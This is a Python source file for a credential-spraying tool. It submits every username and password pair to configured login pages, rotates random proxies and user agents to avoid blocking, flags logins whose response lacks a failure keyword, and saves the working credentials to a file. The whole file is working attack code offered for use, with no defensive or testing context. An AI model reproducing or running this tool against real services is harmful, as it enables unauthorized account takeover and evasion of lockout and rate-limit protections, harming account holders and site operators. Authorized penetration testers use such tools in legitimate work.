import time
import random
import requests

class CredentialSprayer:
    def __init__(self, targets, users, passwords, delay=0, verbose=False, output_file=None, proxy_file=None, user_agent_file=None):
        self.targets = targets
        self.users = users
        self.passwords = passwords
        self.delay = delay
        self.verbose = verbose
        self.output_file = output_file
        self.proxies = self._load_file(proxy_file)
        self.user_agents = self._load_file(user_agent_file)

    def _load_file(self, path):
        try:
            if path:
                with open(path, "r") as f:
                    return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Failed to load {path}: {e}")
        return []

    def spray(self):
        print(f"[INFO] Starting credential spray: {len(self.users)} users x {len(self.passwords)} passwords")

        for target in self.targets:
            url = target.get("url")
            method = target.get("method", "POST").upper()
            login_data_template = target.get("login_data", {})
            fail_keyword = target.get("fail_keyword", "Invalid")

            if not url:
                print("[!] Skipping target: Missing 'url' key")
                continue

            for username in self.users:
                for password in self.passwords:
                    data = {k: v.replace("{user}", username).replace("{pass}", password) for k, v in login_data_template.items()}

                    if self.verbose:
                        print(f"[INFO] Trying {username}:{password} on {url}")

                    try:
                        session = requests.Session()
                        if self.proxies:
                            proxy = random.choice(self.proxies)
                            session.proxies = {"http": proxy, "https": proxy}
                        if self.user_agents:
                            session.headers.update({"User-Agent": random.choice(self.user_agents)})

                        if method == "POST":
                            resp = session.post(url, data=data, timeout=10)
                        else:
                            resp = session.get(url, params=data, timeout=10)

                        if fail_keyword not in resp.text:
                            print(f"[+] Success: {username}:{password}")
                            if self.output_file:
                                with open(self.output_file, "a") as out:
                                    out.write(f"{username}:{password}\n")
                        else:
                            if self.verbose:
                                print(f"[-] Failed: {username}:{password}")

                    except Exception as e:
                        print(f"[ERROR] {e}")

                    if self.delay > 0:
                        time.sleep(self.delay)

        print("[INFO] Spray complete.")
